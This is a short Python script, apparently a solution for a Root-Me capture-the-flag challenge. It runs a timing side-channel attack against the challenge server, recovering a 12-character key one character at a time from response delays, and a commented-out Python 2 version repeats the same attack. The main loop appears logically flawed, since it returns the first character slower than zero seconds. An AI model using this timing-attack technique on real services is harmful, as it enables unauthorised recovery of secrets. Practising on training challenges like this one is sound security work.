# -*-coding:Latin-1 -*

import socket
import time

TARGET_IP = "212.129.38.224"  # ip of challenge01.root-me.org
TARGET_PORT = 51015
BUFFER_SIZE = 1024
CARACTERES = "0123456789-"

key = ''
caracteres_trouves = ''
min_time = 0

# creation du socket
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# connection au client
client.connect((TARGET_IP, TARGET_PORT))


def test_chars(key, min_time):

  for letter in CARACTERES:

    # client.send(key + letter) 
    output = key + letter
    client.sendall(output.encode('utf-8')) 

    # Marquage du début de la requête
    debut = time.time()
    
    # Réception de la réponse
    response = client.recv(BUFFER_SIZE)

    # Marquage de la fin de la requête
    fin = time.time()

    # Calcul de la différence entre le temps du début et de fin
    diff = fin - debut

    print("Diff: " + str(diff))
    print("min_time: " + str(min_time))
    # Si le temps de réponse est supérieur à 0 seconde
    if(diff > min_time):
        # Le temps de réponse minimal est redéfini (il devient plus grand)
        min_time = diff

        # On enregistre le caractère trouvé
        caracteres_trouves = letter
        return letter
    else: pass


# Test global
def global_test( key, min_time ):
  
  for i in range(12):
    key += test_chars(key, min_time)
    # On ajoute le caractere trouvée à la key
    # key += caracteres_trouves

    # On réinitialise le temps minimum
    min_time = 0

    print("key: " + key)

  client.close()
  return key


global_test(key, min_time)




# def getFlag():
#   TCP_IP = '212.129.38.224'  # ip of challenge01.root-me.org
#   TCP_PORT = 51015
#   BUFFER_SIZE = 1024

#   print "[+]- Connecting To %s:%d\n" % (TCP_IP, TCP_PORT)
#   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#   s.connect((TCP_IP, TCP_PORT))
#   data = s.recv(BUFFER_SIZE)
#   print data

#   chars = "0123456789-"
#   time_char = 0
#   char_found = ''
#   key = ''

#   for i in range(12):
#     for c in chars:
#       s.send(key+c)
#       debut = time.time()
#       data = s.recv(BUFFER_SIZE)
#       fin = time.time()
#       diff = fin-debut
#       if(diff > time_char):
#         time_char = diff
#         char_found = c
#     key += char_found
#     time_char = 0
#     print "[+] - key : " + key + "*"*(11-i)
#   s.close()
#   return key


# getFlag()
